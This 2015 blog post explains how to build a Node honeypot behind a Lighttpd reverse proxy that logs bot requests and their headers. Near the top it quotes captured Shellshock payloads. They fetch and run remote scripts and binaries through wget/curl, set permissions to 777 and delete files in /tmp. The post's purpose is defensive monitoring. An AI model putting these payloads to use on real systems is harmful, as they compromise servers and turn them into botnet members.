Catching Spam Bots In the Act with Node
=======================================

Have you ever been searching through your webserver’s logs and noticed
Chinese IP’s making nasty looking requests like… These:

------------------------------------------------------------------------

### Catching Spam Bots In the Act with Node

Have you ever been searching through your webserver’s logs and noticed
Chinese IP’s making nasty looking requests like…  
   
 These:

    GET /cgi-bin/bash HTTP/1.1

    GET /cgi-bin/php HTTP/1.1

    GET /rom-0 HTTP/1.1

This:

    () { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://redacted.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://redacted.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"

Or even *this*?

    () { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://123.456.7.8:911/java -O /tmp/China.Z-rmeo >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-rmeo >> /tmp/Run.sh;echo /tmp/China.Z-rmeo >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\"

**Ouch!**

Though most current web servers are immune to these simple attacks
(assuming, of course, that you've been keeping your packages updated),
it's often interesting to see how bots attempt to exploit vulnerable
services running on web servers.

In some cases, such as the log excerpts above, it's easy to see how this
is achieved. The user-agent is crafted to exploit
<a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271" class="markup--anchor markup--p-anchor">CVE-2014-6271</a>
(AKA Shellshock), which results in some commands being run that turn our
precious server into a mindless zombie :(

However, in other cases, this information is not as apparent. The
default logging configuration for most web servers doesn't include other
data which could potentially be used as an attack vector, such as HTTP
headers!

Therefore, we'll have to write our own script to collect this data from
such nasty requests and log it.

You'll need to either create a script that listens to HTTP requests and
writes all those juicy details to a log file in whatever language you
like (Python, PHP, Ruby, even a Perl CGI script), or find one out on the
net somewhere. I'm just going to reuse
<a href="https://github.com/ctrezevant/node-form-inspector" class="markup--anchor markup--p-anchor">one of my old projects</a>
for this, which just so happens to be written in Node.
<a href="https://gist.github.com/ctrezevant/0b1d6f008d08401b4f66" class="markup--anchor markup--p-anchor">Here's the adapted version.</a>

If you do decide to write your own script, make sure that it does the
following:

-   <span id="8127">Accepts all incoming HTTP connections.</span>
-   <span id="9f6e">Logs the details of those connections to a
    file.</span>
-   <span id="3f57">Returns 200 as the response code (You attract more
    bots with honey than with vinegar, so make the request appear to
    work).</span>
-   <span id="8acc">Is watertight and ready to face the incoming
    nastiness (wouldn’t want to inadvertently become a part of the
    botnet :P)</span>

You may also want to find out some URLs that these bots seem to check
regularly, because we'll need those later for our web server
configuration, but I will have some examples in this post.

I'm going to set this up on my auxiliary server, which also sits in a
"residential" IP space and gets a fair amount of these bots as result.

On to the configuration.

In your web server's configuration, set up a reverse proxy to whatever
port your script is listening for requests on.

Here's one of mine (I run Lighttpd):

    $HTTP["url"] == "/cgi-bin/test.cgi" {

    proxy.server = ( "" => ( (

    "host" => "127.0.0.1",

    "port" => 8082 ) ) )

Pretty straightforward. We take all requests for /cgi-bin/test.cgi and
proxy them to our script, which in this case is running on port 8082 on
the local machine.

Apply the configuration and use your favorite command line utility to
make a request to your shiny new reverse proxy.  
 Here's an example output from mine:

    { "fi_timeStamp": "2015:04:22:06:01:55", "fi_requestIP": "127.0.0.1", "fi_method": "GET", "req_headers": { "accept": "text/html, application/xhtml+xml, */*", "user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)", "host": "123.456.7.8:80", "authorization": "Basic Og==", "x-forwarded-for": "432.10.54.21", "x-host": "123.456.7.8:80", "x-forwarded-proto": "http" } }

Once everything is working, just sit back, relax, and keep an eye on
your logs :)  
 UPDATE: I'll be working to keep an active list of spammer IPs
available. I'll post another update when it's up.

Update May 16 2016: See
<a href="https://github.com/ctrezevant/everlasting-botstopper" class="markup--anchor markup--p-anchor">https://github.com/ctrezevant/everlasting-botstopper</a>

------------------------------------------------------------------------

*Originally published at*
<a href="http://blog.ctis.me/2015/04/catching-spam-bots-with-node.html" class="markup--anchor markup--p-anchor"><em>blog.ctis.me</em></a>
*on April 22, 2015.*

By
<a href="https://medium.com/@charltontrez" class="p-author h-card">Charlton Trezevant</a>
on [April 22, 2015](https://medium.com/p/18504ab0fd0).

<a href="https://medium.com/@charltontrez/catching-spam-bots-in-the-act-with-node-18504ab0fd0" class="p-canonical">Canonical link</a>

Exported from [Medium](https://medium.com) on September 20, 2019.
